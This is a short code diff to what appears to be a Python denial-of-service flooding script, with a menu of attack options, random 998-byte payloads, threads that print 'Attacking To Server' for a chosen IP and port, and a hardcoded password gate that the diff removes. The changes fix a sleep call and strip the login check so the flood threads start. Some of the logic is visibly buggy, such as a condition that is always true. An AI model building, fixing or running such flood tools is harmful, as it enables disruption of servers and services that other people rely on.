@@ -60,11 +60,11 @@ if choice=="yes" or choice=="y":
     threads = int(input("┗━>\033[0m:"))
   elif opt==1:
     print("SORRY, CURRENTLY THIS OPTION IS DISABLED DUE TO SOME ISSUES")
-    time.load(1)
+    time.sleep(1)
     print("CHOOSE OPTION 3")
   elif opt==2:
     print("SORRY, CURRENTLY THIS OPTION IS DISABLED DUE TO SOME ISSUES")
-    time.load(1)
+    time.sleep(1)
     print("CHOOSE OPTION 3")
   def xxx():
     data = random._urandom(998)
@@ -117,7 +117,6 @@ if choice=="yes" or choice=="y":
             print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
       except:
         print("[!] Server Attack")
-  if user==hell and pswd==boy:
     for y in range(threads):
       if choice == 'yes' or "y":
           th = threading.Thread(target = xxxx)
